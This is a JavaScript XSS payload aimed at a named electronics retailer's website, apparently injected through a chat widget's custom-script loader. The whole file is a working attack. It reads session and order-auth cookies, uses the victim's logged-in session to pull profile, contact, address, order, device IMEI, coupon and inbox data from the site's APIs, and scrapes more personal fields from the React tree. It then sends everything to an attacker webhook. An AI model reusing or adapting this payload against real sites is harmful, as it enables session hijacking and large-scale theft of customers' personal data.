// mi.com XSS payload — runs in www.mi.com parent frame context
// Injection: Yellow.ai load-custom-js → main.min.js → e.Mv() → document.head.appendChild
// No CORS issue: script origin = www.mi.com, go.buy.mi.com has CORS open for this origin
(async () => {
  const WEBHOOK = 'https://webhook.site/YOUR-UUID'; // <-- replace before use

  // ── 1. Cookies (document.cookie — all non-HttpOnly) ──────────────────────
  // serviceToken, userId, cUserId: JS-set cookies (non-HttpOnly), written by
  // the mi.com app after SSO completes via LH.set() → js-cookie → document.cookie
  // xm_order_btauth: server-set non-HttpOnly order auth token
  const parseCookies = () =>
    document.cookie.split(';').reduce((acc, c) => {
      const [k, ...v] = c.trim().split('=');
      acc[k] = v.join('=');
      return acc;
    }, {});

  const cookies = parseCookies();
  const snap = {
    serviceToken:    cookies['serviceToken']    || null,
    userId:          cookies['userId']          || null,
    cUserId:         cookies['cUserId']         || null,
    xm_order_btauth: cookies['xm_order_btauth'] || null,
    xmuuid:          cookies['xmuuid']          || null,
    xm_geo:          cookies['xm_geo']          || null,
    rawCookies:      document.cookie,
  };

  // ── 2. Authenticated API calls (confirmed CORS-open from www.mi.com) ──────
  // All endpoints return authenticated user data via withCredentials (passToken
  // HttpOnly cookie sent automatically by browser — attacker never sees it,
  // but the browser uses it to authenticate the request)
  const go = 'https://go.buy.mi.com/us';
  const get = async (path) => {
    try {
      const r = await fetch(go + path, { credentials: 'include' });
      return await r.json();
    } catch (e) {
      return { _err: e.message };
    }
  };

  const [profile, user, addresses, orders, devices, coupons, messages] =
    await Promise.all([
      get('/app/userprofile'),             // userId, nickname, avatar, cart count
      get('/user'),                        // email, phone, nickname, birthday, uid
      get('/user/address'),               // shipping: name, phone, street, city, country, zip
      get('/user/expresses-and-comments'),// order history: products, amounts, status
      get('/user/my-devices'),            // registered devices: IMEI, serial, model
      get('/coupon/list'),                // coupon balances and codes
      get('/user/message'),              // inbox messages
    ]);

  // ── 3. React fiber walk — scrape rendered profile fields from DOM ─────────
  // Effective when victim is on /us/user (UserCenter page).
  // Yields: email, phone, nickname, avatar, uid, birthdayMonth/Day
  const fiberWalk = (node, found = {}, depth = 0) => {
    if (!node || depth > 80) return found;
    for (const obj of [node.memoizedProps, node.memoizedState?.memoizedState]) {
      if (!obj || typeof obj !== 'object') continue;
      for (const key of ['email', 'phone', 'nickname', 'nickName', 'uid', 'userId',
                         'avatar', 'headimgurl', 'birthdayMonth', 'birthdayDay']) {
        if (obj[key] !== undefined && obj[key] !== null && String(obj[key]) !== '') {
          found[key] = String(obj[key]).slice(0, 200);
        }
      }
    }
    fiberWalk(node.child,   found, depth + 1);
    fiberWalk(node.sibling, found, depth + 1);
    return found;
  };

  const rootEl  = document.getElementById('root');
  const fbrKey  = rootEl && Object.keys(rootEl).find(k => k.startsWith('__reactFiber'));
  const domData = fbrKey ? fiberWalk(rootEl[fbrKey]) : {};

  // ── 4. Assemble and exfiltrate ────────────────────────────────────────────
  const exfil = {
    ts:       Date.now(),
    origin:   location.href,
    cookies:  snap,     // serviceToken, userId, xm_order_btauth (non-HttpOnly)
    domData,            // React fiber: email, phone, nickname (if on profile page)
    api: {
      profile,          // { userId, nickname, icon, cart }
      user,             // { email, phone, nickname, uid, birthday }
      addresses,        // [ { name, phone, address1, city, country, zip } ]
      orders,           // order history
      devices,          // [ { deviceName, imei, sn, model } ]
      coupons,          // coupon list
      messages,         // inbox
    },
  };

  const body = JSON.stringify(exfil);

  // sendBeacon — fire-and-forget, works even on page unload
  navigator.sendBeacon(WEBHOOK + '?xss=mi', body);

  // fetch POST — handles larger payloads
  fetch(WEBHOOK, {
    method:  'POST',
    body,
    headers: { 'Content-Type': 'application/json' },
  }).catch(() => {});
})();
